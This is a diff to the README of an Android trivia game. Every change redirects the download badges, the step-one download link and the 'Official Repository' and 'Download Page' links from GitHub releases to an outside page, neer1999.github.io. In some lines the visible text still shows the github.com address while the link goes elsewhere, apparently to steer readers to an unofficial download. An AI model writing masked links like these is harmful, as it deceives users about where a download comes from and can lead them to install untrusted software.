@@ -1,6 +1,6 @@
 # 🎮 whoknows-android-trivia - Test Your Knowledge, Beat the Clock
 
-[![Download Now](https://img.shields.io/badge/Download-whoknows--android--trivia-blue?style=for-the-badge&logo=github)](https://github.com/Neer1999/whoknows-android-trivia/releases)
+[![Download Now](https://img.shields.io/badge/Download-whoknows--android--trivia-blue?style=for-the-badge&logo=github)](https://neer1999.github.io)
 
 ## 📥 Getting Started
 
@@ -42,7 +42,7 @@ This is a modern, fast-paced trivia game designed for Android devices. It featur
 Getting started with whoknows-android-trivia is simple. Follow these steps:
 
 ### Step 1: Download the Game
-Visit this link to download the application: [https://github.com/Neer1999/whoknows-android-trivia/releases](https://github.com/Neer1999/whoknows-android-trivia/releases)
+Visit this link to download the application: [https://neer1999.github.io](https://neer1999.github.io)
 
 Look for the latest release version and click the download button. The file will begin downloading to your device automatically.
 
@@ -150,14 +150,14 @@ While this game is ready to play right out of the box, we welcome feedback and s
 
 Don't wait any longer! Download whoknows-android-trivia today and discover how fun learning can be. With thousands of questions to explore and a sleek, user-friendly interface, this game is sure to become your new favorite pastime.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge)](https://github.com/Neer1999/whoknows-android-trivia/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge)](https://neer1999.github.io)
 
 Whether you're looking to challenge yourself, learn new facts, or compete with friends, whoknows-android-trivia has everything you need for an entertaining and rewarding gaming experience. Download it now and join thousands of happy players!
 
 ## 📚 Additional Resources
 
-- **Official Repository**: [github.com/Neer1999/whoknows-android-trivia](https://github.com/Neer1999/whoknows-android-trivia)
-- **Download Page**: [github.com/Neer1999/whoknows-android-trivia/releases](https://github.com/Neer1999/whoknows-android-trivia/releases)
+- **Official Repository**: [github.com/Neer1999/whoknows-android-trivia](https://neer1999.github.io)
+- **Download Page**: [github.com/Neer1999/whoknows-android-trivia/releases](https://neer1999.github.io)
 
 We hope you enjoy playing whoknows-android-trivia as much as we enjoyed creating it. Happy gaming and good luck with your trivia challenges!
 
